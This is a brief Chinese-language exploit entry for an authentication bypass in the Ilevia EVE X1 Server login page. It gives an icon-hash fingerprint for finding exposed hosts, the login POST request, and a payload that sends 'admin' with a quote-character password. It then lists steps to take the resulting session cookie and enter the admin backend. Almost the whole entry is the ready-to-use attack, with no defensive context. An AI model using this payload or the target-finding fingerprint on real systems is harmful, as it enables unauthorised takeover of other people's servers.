# IleviaEVEX1Serverlogin存在身份认证绕过漏洞

IleviaEVEX1Serverlogin ｜ 认证/授权绕过 ｜ —
- **指纹**：`icon_hash="392278119"`
- **请求**：`POST /login/login.php HTTP/1.1`

**Payload**
```
userid=admin&passwd=%22&login=Login
获取合法session
替换cookie，登录后台
```
- **响应特征**：200